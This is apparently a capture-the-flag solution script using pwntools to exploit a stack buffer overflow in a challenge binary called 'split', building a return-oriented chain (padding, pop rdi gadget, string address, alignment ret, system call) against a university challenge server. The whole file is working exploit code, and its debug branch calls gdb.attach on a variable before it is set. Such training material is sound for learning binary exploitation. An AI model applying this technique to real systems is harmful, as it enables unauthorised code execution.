#!/usr/bin/python3

from pwn import *

e = ELF("./split_patched")

ADDRESS = 'cyberchallenge.diag.uniroma1.it'
PORT = 5016

context.binary = e
context.terminal = ['ptyxis', '-e']
# context.log_level = 'debug'


def conn():
    if args.REMOTE:
        r = remote(ADDRESS, PORT)
    else:
        if args.GDB:
            gdb.attach(r)
        r = process([e.path])

    return r 


def main():
    r = conn()
    r.recvuntil(b"> ")
    payload = b"A"*40
    #payload += b"B"*8 
    
    ''' 1 We fuck off the rdi register value and insert
    the value of the usefulString through his address
        2 System automatically recognizes the first
        arg (rdi) and use it.
    '''
    payload += p64(0x400883)        # pop rdi; ret
    payload += p64(0x601060)        # address of string
    payload += p64(0x4005b9)        # We get aligned with the stack (ret instruction)
    payload += p64(e.plt["system"])  
    r.sendline(payload)
    print(r.recvall())
    # good luck pwning :)

    r.interactive()

if __name__ == "__main__":
    main()
